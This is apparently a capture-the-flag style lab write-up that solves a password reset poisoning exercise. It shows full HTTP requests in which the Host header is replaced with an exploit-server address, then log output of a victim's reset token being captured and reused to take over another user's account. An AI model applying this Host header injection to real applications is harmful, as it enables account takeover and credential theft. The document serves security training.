## Basic password reset poisoning

This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account.

You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.

## Notes

- Possibility to leave a comment on a post
- Exploit server
- Forgot password functionality
- "lab" cookies

## Solve

Go to:

```text
/forgot-password
```

Request a password reset for your own account.

Open the exploit server email client and observe the reset link:

```text
/forgot-password?temp-forgot-password-token=...
```

Click the link once and reset your own password to understand the flow.

In Burp HTTP history, identify the request responsible for sending reset emails:

```http
POST /forgot-password HTTP/2
Host: 0abc009f041f05cb8104edc80043000f.web-security-academy.net
Cookie: _lab=47%7cMC0CFQCR%2fF12bGuFwWkOghs%2bAoKGUd4sKgIUGlkg5V2yow8HYG5Jy2ZANd%2bOS7FUn3DDmwcEfT96kxzYLT35HMKnnRZjgmilifbii3S%2bOWzdllRNKj4iPtGr%2fiYcjFK6Wc4Gw%2fW0aSiz5jY9NK3xoDpVlgZUsXFeORJrIS12Ik8CzaCH; session=jAZVwyGc536j6RJbMfw13XWxI1WRlmnu
Content-Type: application/x-www-form-urlencoded

csrf=4hfVAkggxLBCI5CYiqZ7EaM8Y2zpdFug&username=carlos
```

Send this request to Repeater.

The application generates reset links using the `Host` header value.

Replace:

```http
Host: 0abc009f041f05cb8104edc80043000f.web-security-academy.net
```

with:

```http
Host: exploit-0a1000090414053281fdec99018d004a.exploit-server.net
```

Modified request:

```http
POST /forgot-password HTTP/2
Host: exploit-0a1000090414053281fdec99018d004a.exploit-server.net
Cookie: _lab=47%7cMC0CFQCR%2fF12bGuFwWkOghs%2bAoKGUd4sKgIUGlkg5V2yow8HYG5Jy2ZANd%2bOS7FUn3DDmwcEfT96kxzYLT35HMKnnRZjgmilifbii3S%2bOWzdllRNKj4iPtGr%2fiYcjFK6Wc4Gw%2fW0aSiz5jY9NK3xoDpVlgZUsXFeORJrIS12Ik8CzaCH; session=jAZVwyGc536j6RJbMfw13XWxI1WRlmnu
Content-Type: application/x-www-form-urlencoded

csrf=4hfVAkggxLBCI5CYiqZ7EaM8Y2zpdFug&username=carlos
```

Send the request.

The application now generates a reset URL pointing to the exploit server instead of the legitimate domain.

Go to the exploit server access logs and observe the incoming request from the victim browser:

```text
10.0.4.5        2026-05-26 13:49:55 +0000 "GET /forgot-password?temp-forgot-password-token=gtenfztp40vezn54jyxjxgl1x2uxz6f9 HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

Extract Carlos's reset token:

```text
gtenfztp40vezn54jyxjxgl1x2uxz6f9
```

Copy the legitimate reset URL from your own email:

```text
/forgot-password?temp-forgot-password-token=YOUR_TOKEN
```

Replace your token with Carlos's token:

```text
/forgot-password?temp-forgot-password-token=gtenfztp40vezn54jyxjxgl1x2uxz6f9
```

Open the URL in the browser.

Set a new password for Carlos.

Finally, login using:

```text
username: carlos
password: peter
```

